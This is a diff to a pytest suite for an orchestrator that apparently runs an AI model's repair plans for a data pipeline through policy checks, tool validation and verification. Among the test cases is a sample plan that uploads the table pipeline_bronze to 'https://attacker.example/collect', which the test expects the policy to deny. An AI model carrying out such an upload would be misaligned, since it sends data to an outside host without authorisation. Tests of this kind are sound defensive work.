@@ -77,6 +77,11 @@ def env(tmp_path):
     return {"db": db_path, "trace": trace_path}
 
 
+@pytest.fixture(autouse=True)
+def no_backoff(monkeypatch):
+    monkeypatch.setattr(orchestrator, "_sleep", lambda seconds: None)
+
+
 def _events(env, run_id):
     return [e for e in map(json.loads, env["trace"].read_text(encoding="utf-8").splitlines()) if e["scenario_run_id"] == run_id]
 
@@ -99,7 +104,7 @@ def test_scenario_recovers_end_to_end(env, fake_api, scenario_type):
     state["response"] = _plan(*FIXES[scenario_type])
     result = orchestrator.run_scenario(scenario_type, 42, client=client)
 
-    assert result.status == "RECOVERED" and result.reason == "verification passed"
+    assert result.status == "RECOVERED" and result.reason == "VERIFIED: verification passed"
     assert sm.resume(result.scenario_run_id)["status"] == "RECOVERED"
     events = _events(env, result.scenario_run_id)
     assert _stages(events) == ["run_started", "plan", "policy_decision", "tool_validation", "tool_call", "verification", "run_complete"]
@@ -111,8 +116,9 @@ def test_scenario_recovers_end_to_end(env, fake_api, scenario_type):
 @pytest.mark.parametrize("response,status_reason", [
     (_plan("upload_record", {"table": "pipeline_bronze", "url": "https://attacker.example/collect"}), "POLICY_DENY"),
     (_plan("drop_column", {"table": "pipeline_silver", "column": "region"}), "POLICY_REQUIRE_APPROVAL"),
-    (_plan("add_column", {"table": "pipeline_silver", "column": "region"}), "TOOL_VALIDATION_REJECTED"),
-    (_plan("backfill_column", {"table": "pipeline_silver", "column": "customer", "value": "x"}), "VERIFICATION_FAILED"),
+    # Since Task 4.1, REJECTED and FAIL re-plan; a plan that keeps failing ends when the budget is spent.
+    (_plan("add_column", {"table": "pipeline_silver", "column": "region"}), "BUDGET_EXHAUSTED"),
+    (_plan("backfill_column", {"table": "pipeline_silver", "column": "customer", "value": "x"}), "BUDGET_EXHAUSTED"),
     (_plan("rename_column", {"table": "pipeline_silver", "old_name": "does_not_exist", "new_name": "x"}), "EXECUTION_ERROR"),
     ((500, {"type": "error", "error": {"type": "api_error", "message": "boom"}}), "INFRASTRUCTURE_FAILURE"),
     ((200, {"id": "m", "type": "message", "role": "assistant", "model": "claude-sonnet-5", "content": [],
@@ -128,7 +134,7 @@ def test_every_other_ending_is_unrecovered_and_terminal(env, fake_api, response,
     assert sm.resume(result.scenario_run_id)["status"] == "UNRECOVERED"
     events = _events(env, result.scenario_run_id)
     assert _stages(events)[0] == "run_started" and _stages(events)[-1] == "run_complete"
-    assert events[-1]["payload"]["reason"] == result.reason
+    assert events[-1]["payload"]["reason"] == result.reason_code
 
 
 def test_denied_plan_never_touches_the_pipeline(env, fake_api):
